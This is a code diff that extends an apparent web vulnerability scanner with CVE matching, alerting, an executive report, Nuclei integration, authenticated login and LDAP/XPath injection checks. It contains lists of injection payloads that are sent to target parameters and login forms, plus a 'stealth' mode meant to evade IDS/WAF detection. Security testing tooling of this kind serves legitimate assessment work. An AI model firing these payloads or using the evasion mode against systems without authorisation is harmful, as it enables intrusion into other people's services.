+    if not tech_findings:
+        info("CVE Exploit: No technology fingerprints found — run tech detection first")
+        _module_done("cve_exploit"); return
+
+    # CVE database — technology → known CVEs with CVSS
+    CVE_DB = {
+        "apache": [
+            {"cve":"CVE-2021-41773","cvss":"9.8","desc":"Path traversal and RCE in Apache 2.4.49",
+             "affected":"Apache 2.4.49","fix":"Upgrade to 2.4.51+"},
+            {"cve":"CVE-2021-42013","cvss":"10.0","desc":"Path traversal bypass in Apache 2.4.49-2.4.50",
+             "affected":"Apache 2.4.49-2.4.50","fix":"Upgrade to 2.4.51+"},
+            {"cve":"CVE-2022-31813","cvss":"9.8","desc":"mod_proxy forwarding issue",
+             "affected":"Apache 2.4.0-2.4.53","fix":"Upgrade to 2.4.54+"},
+        ],
+        "nginx": [
+            {"cve":"CVE-2021-23017","cvss":"7.7","desc":"1-byte memory overwrite in NGINX resolver",
+             "affected":"nginx 0.6.18-1.20.0","fix":"Upgrade to 1.20.1+"},
+            {"cve":"CVE-2019-20372","cvss":"5.3","desc":"Memory disclosure via HTTP/2",
+             "affected":"nginx 1.17.7+","fix":"Upgrade to 1.17.9+"},
+        ],
+        "php": [
+            {"cve":"CVE-2024-4577","cvss":"9.8","desc":"Argument injection via PHP-CGI on Windows",
+             "affected":"PHP <8.3.8, <8.2.20, <8.1.29","fix":"Upgrade PHP"},
+            {"cve":"CVE-2021-21705","cvss":"5.3","desc":"SSRF via php-pear",
+             "affected":"PHP <7.3.28, <7.4.21, <8.0.8","fix":"Upgrade PHP"},
+            {"cve":"CVE-2019-11043","cvss":"9.8","desc":"RCE in PHP-FPM + nginx config",
+             "affected":"PHP <7.3.11","fix":"Upgrade PHP + fix nginx config"},
+        ],
+        "wordpress": [
+            {"cve":"CVE-2022-21661","cvss":"7.5","desc":"SQL injection via WP_Query",
+             "affected":"WordPress <5.8.3","fix":"Update WordPress core"},
+            {"cve":"CVE-2022-21662","cvss":"8.0","desc":"Stored XSS in WordPress",
+             "affected":"WordPress <5.8.3","fix":"Update WordPress core"},
+            {"cve":"CVE-2023-2745","cvss":"5.4","desc":"Directory traversal in WordPress",
+             "affected":"WordPress <6.2.1","fix":"Update to 6.2.1+"},
+        ],
+        "drupal": [
+            {"cve":"CVE-2018-7600","cvss":"9.8","desc":"Drupalgeddon2 — RCE",
+             "affected":"Drupal <7.58, <8.3.9, <8.4.6, <8.5.1","fix":"Update Drupal"},
+            {"cve":"CVE-2019-6340","cvss":"9.8","desc":"RCE via REST API",
+             "affected":"Drupal 8.5.x <8.5.11","fix":"Update Drupal"},
+        ],
+        "joomla": [
+            {"cve":"CVE-2023-23752","cvss":"5.3","desc":"Improper access check to webservice",
+             "affected":"Joomla 4.0.0-4.2.7","fix":"Update to 4.2.8+"},
+            {"cve":"CVE-2015-8562","cvss":"7.5","desc":"RCE via object injection",
+             "affected":"Joomla <3.4.6","fix":"Update Joomla"},
+        ],
+        "tomcat": [
+            {"cve":"CVE-2020-1938","cvss":"9.8","desc":"Ghostcat — AJP file read/RCE",
+             "affected":"Tomcat <6.0.54, <7.0.100, <8.5.51, <9.0.31","fix":"Upgrade or disable AJP"},
+            {"cve":"CVE-2019-0232","cvss":"8.1","desc":"RCE via CGI Servlet on Windows",
+             "affected":"Tomcat <7.0.94, <8.5.40, <9.0.19","fix":"Upgrade Tomcat"},
+        ],
+        "iis": [
+            {"cve":"CVE-2017-7269","cvss":"10.0","desc":"Buffer overflow in WebDAV",
+             "affected":"IIS 6.0","fix":"Upgrade to IIS 7.5+"},
+            {"cve":"CVE-2021-31166","cvss":"9.8","desc":"HTTP Protocol Stack RCE",
+             "affected":"Windows Server 2004/20H2","fix":"Apply KB5003173"},
+        ],
+        "openssl": [
+            {"cve":"CVE-2022-0778","cvss":"7.5","desc":"Infinite loop in BN_mod_sqrt()",
+             "affected":"OpenSSL <1.0.2zd, <1.1.1n, <3.0.2","fix":"Upgrade OpenSSL"},
+            {"cve":"CVE-2016-0800","cvss":"5.9","desc":"DROWN attack on SSLv2",
+             "affected":"OpenSSL with SSLv2 support","fix":"Disable SSLv2"},
+        ],
+        "jquery": [
+            {"cve":"CVE-2019-11358","cvss":"6.1","desc":"Prototype pollution in jQuery.extend()",
+             "affected":"jQuery <3.4.0","fix":"Upgrade to 3.4.0+"},
+            {"cve":"CVE-2020-11022","cvss":"6.1","desc":"XSS in .html()/.append() methods",
+             "affected":"jQuery >=1.2 <3.5.0","fix":"Upgrade to 3.5.0+"},
+        ],
+        "log4j": [
+            {"cve":"CVE-2021-44228","cvss":"10.0","desc":"Log4Shell — JNDI injection RCE",
+             "affected":"Log4j 2.0-beta9 to 2.14.1","fix":"Upgrade to 2.17.1+"},
+            {"cve":"CVE-2021-45046","cvss":"9.0","desc":"Log4Shell bypass via context lookups",
+             "affected":"Log4j 2.15.0","fix":"Upgrade to 2.17.1+"},
+        ],
+        "spring": [
+            {"cve":"CVE-2022-22965","cvss":"9.8","desc":"Spring4Shell — RCE via data binding",
+             "affected":"Spring Framework <5.3.18, <5.2.20","fix":"Upgrade Spring Framework"},
+            {"cve":"CVE-2022-22963","cvss":"9.8","desc":"RCE via SpEL injection in Spring Cloud",
+             "affected":"Spring Cloud Function <3.1.7, <3.2.3","fix":"Upgrade Spring Cloud"},
+        ],
+        "struts": [
+            {"cve":"CVE-2017-5638","cvss":"10.0","desc":"RCE via Content-Type header (Equifax breach)",
+             "affected":"Struts 2.3.5-2.3.31, 2.5-2.5.10","fix":"Upgrade to 2.5.12+"},
+            {"cve":"CVE-2018-11776","cvss":"8.1","desc":"RCE via namespace value",
+             "affected":"Struts 2.3-2.5.16","fix":"Upgrade to 2.3.35 / 2.5.17"},
+        ],
+        "elasticsearch": [
+            {"cve":"CVE-2015-1427","cvss":"10.0","desc":"Groovy sandbox escape RCE",
+             "affected":"Elasticsearch <1.5.0","fix":"Upgrade or disable dynamic scripting"},
+            {"cve":"CVE-2014-3120","cvss":"7.5","desc":"RCE via MVEL dynamic scripting",
+             "affected":"Elasticsearch <1.3.8","fix":"Upgrade Elasticsearch"},
+        ],
+        "redis": [
+            {"cve":"CVE-2022-0543","cvss":"10.0","desc":"Lua sandbox escape RCE",
+             "affected":"Redis on Debian/Ubuntu systems","fix":"Apply system package update"},
+            {"cve":"CVE-2016-10517","cvss":"7.4","desc":"Unauthenticated access to data",
+             "affected":"Redis without requirepass","fix":"Set requirepass and bind to localhost"},
+        ],
+    }
+
+    info("CVE Exploit: Matching detected technologies against CVE database...")
+    found = False
+
+    for item in tech_findings:
+        if not isinstance(item, dict): continue
+        tech_text = (str(item.get("title","")) + " " +
+                     str(item.get("detail","")) + " " +
+                     str(item.get("description",""))).lower()
+
+        for tech_key, cves in CVE_DB.items():
+            if tech_key in tech_text:
+                for cve_info in cves:
+                    add("cve_exploit", {
+                        "type": f"Known CVE — {cve_info['cve']}",
+                        "severity": "Critical" if float(cve_info["cvss"]) >= 9.0 else
+                                    "High"     if float(cve_info["cvss"]) >= 7.0 else "Medium",
+                        "cve": cve_info["cve"],
+                        "cvss": cve_info["cvss"],
+                        "technology": tech_key,
+                        "url": url,
+                        "detail": f"{cve_info['cve']} (CVSS {cve_info['cvss']}): {cve_info['desc']} — Affects: {cve_info['affected']}",
+                        "remediation": cve_info["fix"],
+                    })
+                    sev = ("Critical" if float(cve_info["cvss"]) >= 9.0 else
+                           "High"     if float(cve_info["cvss"]) >= 7.0 else "Medium")
+                    vuln(f"CVE {cve_info['cve']} (CVSS {cve_info['cvss']}) — {tech_key}: {cve_info['desc']}", sev)
+                    found = True
+
+    if not found:
+        good("CVE Exploit: No known CVE matches for detected technologies")
+    _module_done("cve_exploit")
+
+
+# ═══ ALERT SYSTEM — Telegram + Slack (v13.0) ══════════════════════
+def _send_telegram_alert(message):
+    """Send critical finding alert to Telegram."""
+    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN","").strip()
+    chat_id   = os.environ.get("TELEGRAM_CHAT_ID","").strip()
+    if not bot_token or not chat_id:
+        return
+    try:
+        tg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        payload = json.dumps({"chat_id": chat_id, "text": message, "parse_mode": "HTML"}).encode()
+        req = _ur.Request(tg_url, data=payload,
+                          headers={"Content-Type": "application/json"}, method="POST")
+        _ur.urlopen(req, timeout=5)
+        info("Telegram alert sent ✅")
+    except Exception as _e:
+        warn(f"Telegram alert failed: {_e}")
+
+
+def _send_slack_alert(message):
+    """Send critical finding alert to Slack."""
+    webhook_url = os.environ.get("SLACK_WEBHOOK_URL","").strip()
+    if not webhook_url:
+        return
+    try:
+        payload = json.dumps({"text": message}).encode()
+        req = _ur.Request(webhook_url, data=payload,
+                          headers={"Content-Type": "application/json"}, method="POST")
+        _ur.urlopen(req, timeout=5)
+        info("Slack alert sent ✅")
+    except Exception as _e:
+        warn(f"Slack alert failed: {_e}")
+
+
+def send_critical_alerts(url):
+    """Send Telegram/Slack alerts for all Critical findings after scan."""
+    tg_token  = os.environ.get("TELEGRAM_BOT_TOKEN","").strip()
+    tg_chat   = os.environ.get("TELEGRAM_CHAT_ID","").strip()
+    sl_hook   = os.environ.get("SLACK_WEBHOOK_URL","").strip()
+    if not any([tg_token, sl_hook]):
+        return
+
+    critical_findings = []
+    for cat, items in FINDINGS.items():
+        _, label = CAT_TITLES.get(cat, ("🔍", cat.upper()))
+        for item in (items if isinstance(items, list) else []):
+            if isinstance(item, dict) and item.get("severity") == "Critical":
+                critical_findings.append((label, item))
+
+    if not critical_findings:
+        return
+
+    section("ALERT — CRITICAL FINDINGS NOTIFICATION","🚨")
+    counts = _sev_counts()
+    summary = (
+        f"🚨 <b>WebScan Pro — Critical Alert</b>\n"
+        f"🎯 Target: {url}\n"
+        f"⏱ Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"💀 Critical: {counts.get('Critical',0)} | 🔴 High: {counts.get('High',0)} | "
+        f"🟡 Medium: {counts.get('Medium',0)}\n\n"
+        f"<b>Critical Findings:</b>\n"
+    )
+    for label, item in critical_findings[:10]:  # max 10
+        title = item.get("title") or item.get("type","Finding")
+        detail = str(item.get("detail",""))[:100]
+        summary += f"⚠ [{label}] {title}\n   {detail}\n"
+
+    if len(critical_findings) > 10:
+        summary += f"\n... and {len(critical_findings)-10} more critical findings."
+
+    _send_telegram_alert(summary)
+    _send_slack_alert(summary.replace("<b>","*").replace("</b>","*").replace("<br>","\n"))
+    good(f"Alerts sent for {len(critical_findings)} critical finding(s)")
+
+
+# ═══ EXECUTIVE SUMMARY REPORT (v13.0) ════════════════════════════
+def _build_executive_report(target, out_path):
+    """Build a non-technical Executive Summary report for management/clients."""
+    counts = _sev_counts()
+    total  = _total()
+    score  = _risk_score()
+    ts_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    # Risk level
+    if score >= 80:   risk_label, risk_color, risk_icon = "CRITICAL RISK", "#c0392b", "💀"
+    elif score >= 60: risk_label, risk_color, risk_icon = "HIGH RISK",     "#e74c3c", "🔴"
+    elif score >= 40: risk_label, risk_color, risk_icon = "MEDIUM RISK",   "#f39c12", "🟡"
+    elif score >= 20: risk_label, risk_color, risk_icon = "LOW RISK",      "#27ae60", "🟢"
+    else:             risk_label, risk_color, risk_icon = "MINIMAL RISK",  "#2ecc71", "✅"
+
+    # Top critical/high findings for executives
+    top_findings = []
+    for cat, items in FINDINGS.items():
+        meta  = CAT_META.get(cat, {})
+        _, label = CAT_TITLES.get(cat, ("🔍", cat.upper()))
+        for item in (items if isinstance(items, list) else []):
+            if isinstance(item, dict) and item.get("severity") in ("Critical","High"):
+                biz_impact = meta.get("biz","")
+                top_findings.append({
+                    "category": label,
+                    "severity": item.get("severity","High"),
+                    "title": item.get("title") or item.get("type", cat),
+                    "biz_impact": biz_impact,
+                    "remediation": item.get("remediation") or item.get("recommendation",""),
+                })
+    top_findings.sort(key=lambda x: 0 if x["severity"]=="Critical" else 1)
+
+    html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Executive Security Summary</title>
+<style>
+  *{{box-sizing:border-box;margin:0;padding:0}}
+  body{{font-family:'Segoe UI',Arial,sans-serif;background:#f4f6f9;color:#2c3e50}}
+  .cover{{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
+          color:#fff;padding:60px 40px;text-align:center;min-height:200px}}
+  .cover h1{{font-size:2.5em;font-weight:300;letter-spacing:2px;margin-bottom:10px}}
+  .cover .target{{font-size:1.2em;opacity:.8;margin-bottom:20px;word-break:break-all}}
+  .cover .date{{font-size:.9em;opacity:.6}}
+  .risk-badge{{display:inline-block;padding:12px 30px;border-radius:30px;
+               background:{risk_color};color:#fff;font-size:1.4em;
+               font-weight:bold;margin:20px 0;letter-spacing:1px}}
+  .container{{max-width:900px;margin:30px auto;padding:0 20px}}
+  .card{{background:#fff;border-radius:12px;padding:28px;margin-bottom:24px;
+         box-shadow:0 2px 12px rgba(0,0,0,.08)}}
+  .card h2{{font-size:1.3em;color:#1a1a2e;border-bottom:2px solid #eee;
+             padding-bottom:12px;margin-bottom:18px}}
+  .kpi-grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px}}
+  .kpi{{text-align:center;padding:20px 10px;border-radius:10px;color:#fff}}
+  .kpi.critical{{background:#c0392b}} .kpi.high{{background:#e74c3c}}
+  .kpi.medium{{background:#f39c12}} .kpi.low{{background:#27ae60}}
+  .kpi.info{{background:#3498db}} .kpi.total{{background:#2c3e50}}
+  .kpi .num{{font-size:2.5em;font-weight:bold;line-height:1}}
+  .kpi .lbl{{font-size:.85em;opacity:.9;margin-top:6px;text-transform:uppercase}}
+  .finding{{border-left:4px solid #e74c3c;padding:16px;margin-bottom:14px;
+             background:#fff8f8;border-radius:0 8px 8px 0}}
+  .finding.Critical{{border-color:#c0392b;background:#fff0f0}}
+  .finding.High{{border-color:#e74c3c;background:#fff5f5}}
+  .finding-title{{font-weight:600;font-size:1em;color:#1a1a2e}}
+  .finding-cat{{font-size:.8em;color:#7f8c8d;margin:4px 0}}
+  .finding-biz{{font-size:.9em;color:#34495e;margin:8px 0;line-height:1.5}}
+  .finding-fix{{font-size:.85em;color:#27ae60;margin-top:8px}}
+  .gauge-wrap{{text-align:center;margin:10px 0}}
+  .gauge-bar{{height:18px;border-radius:9px;background:#ecf0f1;overflow:hidden;margin:8px 0}}
+  .gauge-fill{{height:100%;border-radius:9px;background:{risk_color};
+               width:{min(score,100):.0f}%;transition:width .3s}}
+  .gauge-score{{font-size:2em;font-weight:bold;color:{risk_color}}}
+  .recommendations{{counter-reset:rec}}
+  .rec-item{{counter-increment:rec;display:flex;gap:14px;padding:14px;
+              margin-bottom:10px;background:#f8f9fa;border-radius:8px}}
+  .rec-num{{min-width:32px;height:32px;background:#1a1a2e;color:#fff;
+             border-radius:50%;display:flex;align-items:center;justify-content:center;
+             font-weight:bold;font-size:.9em;flex-shrink:0}}
+  .rec-text{{font-size:.9em;color:#2c3e50;line-height:1.5}}
+  .footer{{text-align:center;padding:30px;color:#95a5a6;font-size:.85em}}
+  @media print{{body{{background:#fff}}.cover{{-webkit-print-color-adjust:exact}}}}
+</style>
+</head>
+<body>
+<div class="cover">
+  <h1>⚡ SECURITY ASSESSMENT</h1>
+  <div class="target">🎯 {target}</div>
+  <div class="date">📅 {ts_str}</div>
+  <div class="risk-badge">{risk_icon} {risk_label}</div>
+</div>
+
+<div class="container">
+
+  <!-- Risk Score -->
+  <div class="card">
+    <h2>📊 Overall Risk Score</h2>
+    <div class="gauge-wrap">
+      <div class="gauge-score">{score:.0f} / 100</div>
+      <div class="gauge-bar"><div class="gauge-fill"></div></div>
+      <p style="color:#7f8c8d;font-size:.9em">
+        {risk_icon} {risk_label} — based on severity-weighted finding analysis
+      </p>
+    </div>
+  </div>
+
+  <!-- KPIs -->
+  <div class="card">
+    <h2>🔢 Finding Summary</h2>
+    <div class="kpi-grid">
+      <div class="kpi total"><div class="num">{total}</div><div class="lbl">Total</div></div>
+      <div class="kpi critical"><div class="num">{counts.get('Critical',0)}</div><div class="lbl">Critical</div></div>
+      <div class="kpi high"><div class="num">{counts.get('High',0)}</div><div class="lbl">High</div></div>
+      <div class="kpi medium"><div class="num">{counts.get('Medium',0)}</div><div class="lbl">Medium</div></div>
+      <div class="kpi low"><div class="num">{counts.get('Low',0)}</div><div class="lbl">Low</div></div>
+      <div class="kpi info"><div class="num">{counts.get('Info',0)}</div><div class="lbl">Info</div></div>
+    </div>
+  </div>
+
+  <!-- Business Impact -->
+  <div class="card">
+    <h2>💼 Critical & High Business Impact</h2>
+    {"".join(f'''
+    <div class="finding {f['severity']}">
+      <div class="finding-title">{f['title']}</div>
+      <div class="finding-cat">📂 {f['category']} &nbsp;|&nbsp; ⚠ {f['severity']}</div>
+      {"<div class='finding-biz'>🏢 <strong>Business Impact:</strong> "+f['biz_impact']+"</div>" if f['biz_impact'] else ""}
+      {"<div class='finding-fix'>✅ <strong>Fix:</strong> "+str(f['remediation'])[:200]+"</div>" if f['remediation'] else ""}
+    </div>''' for f in top_findings[:15]) or "<p style='color:#7f8c8d'>No Critical or High findings.</p>"}
+  </div>
+
+  <!-- Recommendations -->
+  <div class="card">
+    <h2>✅ Top Recommendations</h2>
+    <div class="recommendations">
+      {"".join(f'<div class="rec-item"><div class="rec-num">{i+1}</div><div class="rec-text">{r}</div></div>' for i,r in enumerate([
+        "Immediately patch all Critical vulnerabilities — these represent active exploitation risk.",
+        "Implement a Web Application Firewall (WAF) to block common attack patterns.",
+        "Conduct quarterly penetration tests to identify new vulnerabilities before attackers do.",
+        "Implement a vulnerability disclosure policy and bug bounty program.",
+        "Train development teams on secure coding practices (OWASP Top 10).",
+        "Enable multi-factor authentication (MFA) on all administrative interfaces.",
+        "Review and restrict all API endpoints — apply rate limiting and authentication.",
+        "Encrypt all sensitive data at rest and in transit using TLS 1.2+.",
+      ]))}
+    </div>
+  </div>
+
+</div>
+<div class="footer">
+  🔒 Generated by WebScan Pro v13.0 &nbsp;|&nbsp; Confidential — For Authorized Recipients Only
+</div>
+</body>
+</html>"""
+
+    with open(out_path, "w", encoding="utf-8") as f:
+        f.write(html)
+    good(f"Executive Summary saved: {out_path}")
+
+
+# ═══ SCAN SPEED / MODE CONTROL (v13.0) ════════════════════════════
+def _apply_speed_mode(mode):
+    """Apply scan speed presets: fast | normal | stealth | thorough."""
+    global TIMEOUT, MAX_WORKERS, RATE_LIMIT
+    if mode == "fast":
+        TIMEOUT     = 4
+        MAX_WORKERS = 20
+        RATE_LIMIT  = 0.0
+        info("Speed: FAST mode — shorter timeouts, more parallelism, no delays")
+    elif mode == "stealth":
+        TIMEOUT     = 15
+        MAX_WORKERS = 2
+        RATE_LIMIT  = 2.0
+        info("Speed: STEALTH mode — slow, low-noise scan to evade IDS/WAF detection")
+    elif mode == "thorough":
+        TIMEOUT     = 20
+        MAX_WORKERS = 10
+        RATE_LIMIT  = 0.3
+        info("Speed: THOROUGH mode — deep scan, longer timeouts, full module coverage")
+    else:  # normal
+        TIMEOUT     = 7
+        MAX_WORKERS = 10
+        RATE_LIMIT  = 0.0
+        info("Speed: NORMAL mode")
+
+
+
+# ═══════════════════════════════════════════════════════════════════
+# WebScan Pro v14.0 — MODULES 98–127 + PROFESSIONAL FEATURES
+# ═══════════════════════════════════════════════════════════════════
+
+# ═══ MODULE 98 — NUCLEI INTEGRATION (v14.0) ════════════════════════
+def nuclei_scan(url):
+    """MODULE 98 — Nuclei template-based vulnerability scanner."""
+    if _module_skip("nuclei"):
+        info("Skipping Nuclei scan (already done)"); return
+    section("MODULE 98 — NUCLEI INTEGRATION","⚡")
+    nuclei_bin = None
+    for path in ["/usr/bin/nuclei","/usr/local/bin/nuclei",
+                 os.path.expanduser("~/go/bin/nuclei"),"/snap/bin/nuclei"]:
+        if os.path.isfile(path):
+            nuclei_bin = path; break
+    if not nuclei_bin:
+        try:
+            result = subprocess.run(["which","nuclei"], capture_output=True, text=True, timeout=5)
+            if result.returncode == 0:
+                nuclei_bin = result.stdout.strip()
+        except Exception:
+            pass
+    if not nuclei_bin:
+        warn("Nuclei not installed — install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
+        _module_done("nuclei"); return
+    info(f"Nuclei: found at {nuclei_bin}")
+    import tempfile as _tf
+    out_file = _tf.mktemp(suffix=".json")
+    try:
+        cmd = [nuclei_bin, "-u", url, "-jsonl", "-o", out_file,
+               "-severity", "critical,high,medium",
+               "-timeout", "10", "-retries", "1",
+               "-silent", "-no-color"]
+        info("Nuclei: running scan (may take 2-5 minutes)...")
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
+        if os.path.isfile(out_file):
+            with open(out_file) as f:
+                lines = [l.strip() for l in f if l.strip()]
+            count = 0
+            for line in lines:
+                try:
+                    item = json.loads(line)
+                    sev = item.get("info",{}).get("severity","info").capitalize()
+                    name = item.get("info",{}).get("name","Unknown")
+                    tmpl = item.get("template-id","")
+                    matched = item.get("matched-at", url)
+                    desc = item.get("info",{}).get("description","")
+                    refs = item.get("info",{}).get("reference",[])
+                    fix  = "; ".join(refs[:2]) if refs else "See Nuclei template for remediation."
+                    add("nuclei", {
+                        "type": f"Nuclei: {name}",
+                        "severity": sev if sev in ("Critical","High","Medium","Low","Info") else "Medium",
+                        "template": tmpl,
+                        "url": matched,
+                        "detail": f"[{tmpl}] {desc[:200]}",
+                        "remediation": fix,
+                    })
+                    vuln(f"Nuclei [{sev}] {name} — {matched}", sev if sev in ("Critical","High","Medium","Low","Info") else "Medium")
+                    count += 1
+                except Exception:
+                    pass
+            if count:
+                good(f"Nuclei: {count} verified finding(s)")
+            else:
+                good("Nuclei: No findings")
+        else:
+            good("Nuclei: Scan complete — no output file (no findings)")
+    except subprocess.TimeoutExpired:
+        warn("Nuclei: Scan timed out after 10 minutes")
+    except Exception as _e:
+        warn(f"Nuclei error: {_e}")
+    finally:
+        if os.path.isfile(out_file):
+            try: os.unlink(out_file)
+            except Exception: pass
+    _module_done("nuclei")
+
+
+# ═══ MODULE 99 — AUTHENTICATED SCANNING (v14.0) ════════════════════
+def authenticated_scan_login(url, login_url=None, username=None, password=None):
+    """MODULE 99 — Login and obtain authenticated session for scanning."""
+    if _module_skip("auth_scan"):
+        info("Skipping Authenticated Scan (already done)"); return
+    section("MODULE 99 — AUTHENTICATED SCANNING","🔑")
+    if not login_url or not username or not password:
+        info("Auth Scan: --login-url, --login-user, --login-pass not provided — skipping")
+        _module_done("auth_scan"); return
+    info(f"Auth Scan: attempting login at {login_url}")
+    try:
+        # Step 1: GET login page to get CSRF token
+        r = SESSION.get(login_url, timeout=TIMEOUT, verify=False)
+        from bs4 import BeautifulSoup as _BS
+        soup = _BS(r.text, "html.parser")
+        # Find form fields
+        form = soup.find("form")
+        if not form:
+            warn("Auth Scan: No form found on login page"); _module_done("auth_scan"); return
+        # Collect all hidden fields (CSRF tokens, etc.)
+        post_data = {}
+        for inp in form.find_all("input"):
+            name  = inp.get("name","")
+            value = inp.get("value","")
+            if name:
+                post_data[name] = value
+        # Detect username/password fields
+        user_field = pass_field = None
+        for inp in form.find_all("input"):
+            t = inp.get("type","").lower()
+            n = inp.get("name","").lower()
+            if t == "password" or "pass" in n:
+                pass_field = inp.get("name")
+            elif t in ("text","email") or any(x in n for x in ("user","email","login","name")):
+                user_field = inp.get("name")
+        if not user_field or not pass_field:
+            # Fallback: common names
+            user_field = user_field or "username"
+            pass_field = pass_field or "password"
+        post_data[user_field] = username
+        post_data[pass_field] = password
+        # Step 2: POST login
+        action = form.get("action","")
+        if action:
+            from urllib.parse import urljoin as _uj2
+            post_url = _uj2(login_url, action)
+        else:
+            post_url = login_url
+        lr = SESSION.post(post_url, data=post_data, timeout=TIMEOUT,
+                          verify=False, allow_redirects=True)
+        # Detect success: no login form in response, got cookies
+        cookies = dict(SESSION.cookies)
+        is_logged_in = False
+        if cookies and lr.status_code in (200, 302):
+            resp_lower = lr.text.lower()
+            fail_signs = ["invalid","incorrect","wrong","failed","error",
+                          "try again","login","sign in","password"]
+            success_signs = ["logout","sign out","dashboard","profile",
+                             "welcome","account","home"]
+            if any(s in resp_lower for s in success_signs):
+                is_logged_in = True
+            elif not any(s in resp_lower for s in fail_signs):
+                is_logged_in = True
+        if is_logged_in:
+            good(f"Auth Scan: Login successful! Session cookies: {list(cookies.keys())}")
+            add("auth_scan", {
+                "type": "Authenticated Session Established",
+                "severity": "Info",
+                "url": login_url,
+                "detail": f"Successfully logged in as '{username}' — all subsequent scan modules use this session.",
+                "cookies": list(cookies.keys()),
+                "remediation": "N/A — authenticated scanning enabled",
+            })
+            info("Auth Scan: All remaining modules will use authenticated session")
+        else:
+            warn(f"Auth Scan: Login may have failed — check credentials or login form structure")
+            add("auth_scan", {
+                "type": "Authentication Attempted",
+                "severity": "Info",
+                "url": login_url,
+                "detail": f"Login attempt at {login_url} with user '{username}' — result uncertain",
+                "remediation": "N/A",
+            })
+    except Exception as _e:
+        warn(f"Auth Scan error: {_e}")
+    _module_done("auth_scan")
+
+
+# ═══ MODULE 100 — LDAP INJECTION (v14.0) ══════════════════════════
+def ldap_injection_scan(url):
+    """MODULE 100 — LDAP injection detection."""
+    if _module_skip("ldap_inject"):
+        info("Skipping LDAP Injection (already done)"); return
+    section("MODULE 100 — LDAP INJECTION","📂")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    params = parse_qs(parsed.query)
+    found  = False
+    payloads = [
+        ("*", "LDAP wildcard — returns all entries"),
+        ("*)(uid=*", "LDAP filter bypass"),
+        ("*)(|(uid=*", "LDAP OR injection"),
+        ("admin)(&)", "LDAP AND injection"),
+        ("*)(objectClass=*", "objectClass dump"),
+        (")(|(cn=*", "CN enumeration"),
+        ("\\2a)(uid=*\\2a", "URL-encoded wildcard"),
+        ("*)(mail=*", "Email enumeration via LDAP"),
+        ("admin)(|(password=*", "Password field injection"),
+        ("\\00", "Null byte LDAP injection"),
+    ]
+    error_signs = ["ldap","invalid dn","filter","objectclass","distinguishedname",
+                   "javax.naming","ldap error","search filter","ldap_search",
+                   "bind failed","invalid syntax","ldaperror","0x"]
+    test_params = list(params.keys())[:3] if params else ["username","user","search","q","login"]
+    for pname in test_params:
+        for payload, desc in payloads:
+            ep = f"{base}{parsed.path}?{pname}={_ue(payload)}"
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                resp_l = r.text.lower()
+                if any(s in resp_l for s in error_signs):
+                    add("ldap_inject", {
+                        "type": "LDAP Injection",
+                        "severity": "High",
+                        "url": ep,
+                        "param": pname,
+                        "payload": payload,
+                        "detail": f"LDAP error signature detected with payload '{payload}' on param '{pname}': {desc}",
+                        "remediation": (
+                            "1. Use parameterized LDAP queries\n"
+                            "2. Escape special chars: ( ) * \\ NUL\n"
+                            "3. Validate and whitelist all LDAP input\n"
+                            "4. Use LDAP SDK's built-in escaping functions"),
+                    })
+                    vuln(f"LDAP Injection [{pname}={payload}] — {desc}", "High")
+                    found = True
+                    break
+            except Exception:
+                pass
+    # Also test login endpoints
+    for path in ["/login","/auth","/ldap","/directory","/search"]:
+        for payload, desc in payloads[:5]:
+            try:
+                r = SESSION.post(base+path,
+                                 data={"username": payload, "password": "test"},
+                                 timeout=TIMEOUT, verify=False)
+                resp_l = r.text.lower()
+                if any(s in resp_l for s in error_signs):
+                    add("ldap_inject", {
+                        "type": "LDAP Injection via Login",
+                        "severity": "Critical",
+                        "url": base+path,
+                        "payload": payload,
+                        "detail": f"LDAP injection in login form at {base+path} with username='{payload}'",
+                        "remediation": "Escape all LDAP special characters in authentication filters.",
+                    })
+                    vuln(f"LDAP Injection in login at {base+path}", "Critical")
+                    found = True
+                    break
+            except Exception:
+                pass
+    if not found:
+        good("LDAP Injection: No injection points found")
+    _module_done("ldap_inject")
+
+
+# ═══ MODULE 101 — XPATH INJECTION (v14.0) ═════════════════════════
+def xpath_injection_scan(url):
+    """MODULE 101 — XPath injection detection."""
+    if _module_skip("xpath_inject"):
+        info("Skipping XPath Injection (already done)"); return
+    section("MODULE 101 — XPATH INJECTION","📄")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    params = parse_qs(parsed.query)
+    found  = False
+    payloads = [
+        ("' or '1'='1", "Classic XPath OR bypass"),
+        ("' or 1=1 or ''='", "XPath tautology"),
+        ("x' or name()='username' or 'x'='y", "Node name injection"),
+        ("' or count(parent::*[position()=1])=0 or 'a'='b", "XPath count injection"),
+        ("1' and '1'='1", "XPath AND injection"),
+        ("'] | //user/*[contains(*,'", "XPath union"),
+        ("x') or ('1'='1", "Parenthesis bypass"),
+        ("' or substring(name(parent::*[position()=1]),1,1)='a", "Blind XPath prefix"),
+    ]
+    error_signs = ["xpath","xpathexception","javax.xml","xmlexception","xmlparseerror",
+                   "unterminated string","invalid expression","xpath error",
+                   "org.jdom","xmldocument","xpath syntax"]
+    test_params = list(params.keys())[:3] if params else ["id","user","search","q","item"]
+    for pname in test_params:
+        for payload, desc in payloads:
+            ep = f"{base}{parsed.path}?{pname}={_ue(payload)}"
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                resp_l = r.text.lower()
+                if any(s in resp_l for s in error_signs):
+                    add("xpath_inject", {
+                        "type": "XPath Injection",
+                        "severity": "High",
+                        "url": ep,
+                        "param": pname,
+                        "payload": payload,
+                        "detail": f"XPath error with payload '{payload}' on '{pname}': {desc}",
+                        "remediation": (
+                            "1. Use parameterized XPath queries\n"
+                            "2. Never concatenate user input into XPath expressions\n"
+                            "3. Validate and whitelist all XML query input\n"
+                            "4. Use XPath variables instead of string concatenation"),
